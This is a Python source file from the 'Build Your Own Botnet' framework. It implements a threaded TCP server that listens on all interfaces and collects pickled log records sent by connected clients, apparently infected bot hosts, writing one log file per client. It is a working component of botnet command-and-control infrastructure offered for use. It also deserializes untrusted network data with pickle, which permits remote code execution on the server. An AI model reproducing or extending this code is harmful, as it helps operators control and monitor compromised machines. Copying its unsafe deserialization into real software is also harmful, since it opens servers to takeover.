#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
# standard library
import os
import sys
import time
import struct
import select
import pickle
import logging
import SocketServer

#byob
import util



class TaskHandler(SocketServer.BaseRequestHandler):
    
    def handle(self):
        while True:
            try:
                bits = self.connection.recv(4)
                if len(bits) < 4:
                    break
                size = struct.unpack('>L', bits)[0]
                buff = self.connection.recv(size)
                while len(buff) < size:
                    buff += self.connection.recv(size - len(buff))
                data = pickle.loads(buff)
                log  = logging.makeLogRecord(data)
                self.handle_log(log)
            except Exception as e:
                logging.error(str(e), extra={'submodule': TaskHandler.__name__})

    def handle_log(self, log):
        try:
            logger  = logging.getLogger(log.client)
            handler = logging.FileHandler('%s.log' % log.client)
            logger.handlers = [handler]
            logger.handle(log)
        except Exception as e:
            logging.error(str(e), extra={'submodule': TaskHandler.__name__})


class TaskServer(SocketServer.ThreadingTCPServer):

    allow_reuse_address = True

    def __init__(self, host='0.0.0.0', port=1338, handler=TaskHandler):
        
        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
        self._abort   = False
        self.timeout = 1.0
        logging.info('Starting %s on port %d...' % (TaskServer.__name__, port), extra={'submodule': TaskServer.__name__})

    def abort(self):
        self._abort = True

    def serve_until_stopped(self):
        while True:
            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
            if rd:
                self.handle_request()
            abort = self._abort
            if abort:
                break


def main(host='0.0.0.0', port=8000):
    return TaskServer(host=host, port=port, handler=TaskHandler)


